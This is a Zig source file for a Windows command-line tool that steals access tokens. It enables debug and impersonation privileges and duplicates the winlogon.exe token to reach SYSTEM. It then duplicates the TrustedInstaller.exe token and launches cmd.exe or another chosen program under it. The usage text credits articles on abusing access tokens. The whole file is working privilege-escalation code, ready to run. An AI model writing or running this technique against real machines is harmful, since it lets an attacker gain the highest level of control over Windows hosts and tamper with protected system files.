// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const std = @import("std");
const win32 = @import("win32").everything;
const win32_security = @import("win32").security;

const windows = std.os.windows;

const Action = struct {
    const Self = @This();

    command: []u8,
    targetPID: u32,
    tiPID: u32,
    sPID: u32,
    allocator: std.mem.Allocator,
    io: std.Io,

    pub fn init(allocator: std.mem.Allocator, io: std.Io) !Self {
        return Self{
            .command = "",
            .targetPID = 0,
            .tiPID = 0,
            .sPID = 0,
            .allocator = allocator,
            .io = io,
        };
    }

    pub fn GetPIDToken(pid: u32) !?win32.HANDLE {
        var sourceProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
        var hProcess: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        hProcess = win32.OpenProcess(
            win32.PROCESS_QUERY_INFORMATION,
            win32.TRUE,
            pid,
        );
        if (hProcess == null) {
            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ pid, @intFromEnum(win32.GetLastError()) });
            return error.OpenProcessFailed;
        }
        defer _ = Action.CloseHandle(hProcess);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == win32.OpenProcessToken(
            hProcess.?,
            win32_security.TOKEN_ACCESS_MASK{
                .DUPLICATE = 1,
                .QUERY = 1,
                .IMPERSONATE = 1,
                .ASSIGN_PRIMARY = 1,
            },
            &sourceProcessToken,
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d}) for PID {d}", .{ @intFromEnum(win32.GetLastError()), pid });
            return error.OpenProcessTokenFailed;
        }

        return sourceProcessToken;
    }

    pub fn DuplicatePIDToken(pid: u32) !?win32.HANDLE {
        const sourceProcessToken: ?win32.HANDLE = try GetPIDToken(pid);
        var duplicateProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;

        defer _ = Action.CloseHandle(sourceProcessToken);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        if (0 == win32.ImpersonateLoggedOnUser(
            sourceProcessToken.?,
        )) {
            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.ImpersonateLoggedOnUserFailed;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
        if (0 == win32.DuplicateTokenEx(
            sourceProcessToken.?,
            win32_security.TOKEN_ACCESS_MASK{
                .ASSIGN_PRIMARY = 1, // 0x0001 - documented requirement
                .DUPLICATE = 1, // 0x0002 - documented requirement
                .QUERY = 1, // 0x0008 - documented requirement
                .ADJUST_DEFAULT = 1, // 0x0080 - needed internally for NtSetInformationToken
                .ADJUST_SESSIONID = 1, // 0x0100 - needed internally for session assignment
            },
            null,
            win32.SecurityImpersonation,
            win32.TokenPrimary,
            &duplicateProcessToken,
        )) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.DuplicateTokenExFailed;
        }

        return duplicateProcessToken;
    }

    pub fn ModifyPrivilege(privilege: ?[*:0]const u8, pid: u32) !void {
        var tp: win32.TOKEN_PRIVILEGES = undefined;
        var luid: win32.LUID = undefined;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProcess: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_QUERY_INFORMATION,
            win32.TRUE,
            pid,
        );
        if (hProcess == null) {
            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ pid, @intFromEnum(win32.GetLastError()) });
            return error.OpenProcessFailed;
        }
        defer _ = Action.CloseHandle(hProcess);

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        if (0 == win32.LookupPrivilegeValueA(
            null,
            privilege,
            &luid,
        )) {
            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.LookupPrivilegeValueAFailed;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        var processToken: ?win32.HANDLE = null;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == win32.OpenProcessToken(
            hProcess.?,
            win32_security.TOKEN_ADJUST_PRIVILEGES,
            &processToken,
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.OpenProcessTokenFailed;
        }
        defer _ = Action.CloseHandle(processToken);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        if (0 == win32.AdjustTokenPrivileges(
            processToken,
            win32.FALSE,
            &tp,
            @sizeOf(win32.TOKEN_PRIVILEGES),
            null,
            null,
        )) {
            std.log.err("[!] Failed AdjustTokenPrivileges:: error code ({d})", .{@intFromEnum(win32.GetLastError())});

            return error.AdjustTokenPrivilegesFailed;
        }

        std.log.info("[+] Modified {s}", .{privilege.?});
    }

    pub fn execute(self: *Self) !void {
        if (self.targetPID == 0 or self.tiPID == 0 or self.sPID == 0) {
            self.findPIDs();
        }

        if (self.targetPID == 0) {
            std.log.err("[!] Failed to locate parent process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.targetPIDIsZero;
        }

        if (self.tiPID == 0) { // TODO: kick service and go again?
            std.log.err("[!] Failed to locate TrustedInstaller.exe process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.tiPIDIsZero;
        }

        if (self.sPID == 0) {
            std.log.err("[!] Failed to locate winlogon.exe process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.systemPIDIsZero;
        }

        std.log.debug("[+] Using System PID: {d}", .{self.sPID});
        std.log.debug("[+] Using TI PID: {d}", .{self.tiPID});
        std.log.debug("[+] Target PID: {d}", .{self.targetPID});

        // https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
        try Action.ModifyPrivilege(win32.SE_DEBUG_NAME, self.targetPID);
        try Action.ModifyPrivilege(win32.SE_IMPERSONATE_NAME, self.targetPID);

        std.log.info("[+] Privileges Enabled", .{});

        const systemProcessToken: ?win32.HANDLE = try DuplicatePIDToken(self.sPID);
        defer _ = Action.CloseHandle(systemProcessToken);

        std.log.info("[+] Gained System", .{});

        var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);

        startupInfo.cb = @sizeOf(win32.STARTUPINFOW);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const processHandle: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_QUERY_LIMITED_INFORMATION,
            win32.TRUE,
            self.tiPID,
        );
        if (processHandle == null) {
            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ self.tiPID, @intFromEnum(win32.GetLastError()) });
            return error.OpenProcessFailed;
        }

        defer _ = Action.CloseHandle(processHandle);

        const trustedInstallerProcessToken: ?win32.HANDLE = try DuplicatePIDToken(self.tiPID);
        defer Action.CloseHandle(trustedInstallerProcessToken);

        std.log.info("[+] Gained Trusted Installer", .{});

        const lpApplicationName = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, self.command);
        errdefer self.allocator.free(lpApplicationName);

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
        if (0 == win32.CreateProcessWithTokenW(
            trustedInstallerProcessToken.?,
            win32.LOGON_WITH_PROFILE,
            lpApplicationName,
            null,
            @bitCast(win32.CREATE_NEW_CONSOLE),
            null,
            null,
            &startupInfo,
            &processInformation,
        )) {
            std.log.err("[!] Failed CreateProcessWithTokenW :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
            return error.CreateProcessWithTokenWFailed;
        }
    }

    pub fn findPIDs(self: *Self) void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid
        const pid: u32 = win32.GetCurrentProcessId();

        //https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
        const handle = win32.CreateToolhelp32Snapshot(
            win32.TH32CS_SNAPPROCESS,
            0,
        );

        if (handle == win32.INVALID_HANDLE_VALUE) {
            return;
        }

        defer Action.CloseHandle(handle);

        var pe32: win32.PROCESSENTRY32 = std.mem.zeroes(win32.PROCESSENTRY32);
        pe32.dwSize = @sizeOf(win32.PROCESSENTRY32);

        // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
        if (win32.FALSE == win32.Process32First(
            handle,
            &pe32,
        )) {
            return;
        }

        if (self.targetPID == 0 and pe32.th32ProcessID == pid) {
            self.targetPID = pe32.th32ParentProcessID;
            std.log.debug("targetPID: {d} == {d}\n", .{ self.targetPID, pid });
        }

        if (self.tiPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "TrustedInstaller.exe")) {
            self.tiPID = pe32.th32ProcessID;
            std.log.debug("tiPID: {d}\n", .{pe32.th32ProcessID});
        }

        if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
            self.sPID = pe32.th32ProcessID;
            std.log.debug("sPID: {d}\n", .{self.sPID});
        }

        if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
            return;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
        while (win32.TRUE == win32.Process32Next(
            handle,
            &pe32,
        )) {
            if (self.targetPID == 0 and pe32.th32ProcessID == pid) {
                self.targetPID = pe32.th32ParentProcessID;
                std.log.debug("targetPID: {d} {s}\n", .{ self.targetPID, pe32.szExeFile });
            }

            if (self.tiPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "TrustedInstaller.exe")) {
                self.tiPID = pe32.th32ProcessID;
                std.log.debug("tiPID: {d} {s}\n", .{ pe32.th32ProcessID, pe32.szExeFile });
            }

            if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
                self.sPID = pe32.th32ProcessID;
                std.log.debug("sPID: {d} {s}\n", .{ self.sPID, pe32.szExeFile });
            }

            if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
                break;
            }
        }
    }

    pub fn debug(self: *Self) void {
        std.log.debug(
            "\nSystem PID:\t{d}\nTI PID:\t{d}\nTarget PID:\t{d}\nCommand:\t{s}\n",
            .{ self.sPID, self.tiPID, self.targetPID, self.command },
        );
    }

    pub fn parsePID(self: *Self, line: [:0]const u8) !void {
        self.targetPID = try std.fmt.parseInt(u32, line, 10);
    }

    pub fn parseTIPID(self: *Self, line: [:0]const u8) !void {
        self.tiPID = try std.fmt.parseInt(u32, line, 10);
    }

    pub fn parseCommand(self: *Self, line: [:0]const u8) !void {
        self.command = try std.fmt.allocPrint(self.allocator, "{s}", .{line});
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.command);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
        _ = win32.RevertToSelf();
    }

    pub fn CloseHandle(handle: ?win32.HANDLE) void {
        if (handle != null and handle.? != win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            _ = win32.CloseHandle(handle.?);
        }
    }
};

pub fn usage(
    allocator: std.mem.Allocator,
    io: std.Io,
    argv: [:0]const u8,
) !void {
    const buffer: []u8 = try std.fmt.allocPrint(allocator,
        \\  This tool exist thanks to: 
        \\    * https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
        \\    * https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
        \\
        \\Requirements:
        \\  * SE_IMPERSONATE_NAME - "The process that calls CreateProcessWithTokenW must have this privilege."
        \\  * SE_DEBUG_PRIVILEGE
        \\
        \\Usage:
        \\   <PID> <TI PID> <lpApplicationName>
        \\
        \\Example:
        \\
        \\ .\\{s} <target PID> <TI PID> C:\windows\system32\cmd.exe
        \\
        \\ Spawn as TI using the current terminal PID as the <target PID>, iterate processes and attempt to locate the <TI PID>
        \\ .\\{s} 0 0 C:\windows\system32\cmd.exe
        \\
        \\ Exactly as above - shorthand.
        \\ .\\{s} 0 0
    , .{ argv, argv, argv });

    try std.Io.File.stdout().writeStreamingAll(io, buffer);

    std.process.exit(0);
}

pub fn main(init: std.process.Init) !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const args = try init.minimal.args.toSlice(init.arena.allocator());

    if (args.len < 3) {
        try usage(allocator, init.io, args[0]);
    }

    var action = try Action.init(allocator, init.io);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parsePID(arg);
        }

        if (i == 2) {
            try action.parseTIPID(arg);
        }

        if (i == 3) {
            try action.parseCommand(arg);
        }

        i += 1;
    }

    if (action.command.len <= 0) {
        action.command = try std.fmt.allocPrint(action.allocator, "{s}", .{"C:\\windows\\system32\\cmd.exe"});
    }

    const file = std.Io.Dir.openFileAbsolute(init.io, action.command, .{}) catch {
        std.log.err("[!] Failed to open {s}\n", .{action.command});
        return;
    };
    file.close(init.io);

    action.debug();

    action.execute() catch {
        std.log.err("[!] Failed to execute {s}", .{action.command});
        return;
    };

    std.log.info("[+] Executed {s}", .{action.command});

    std.process.exit(0);
}
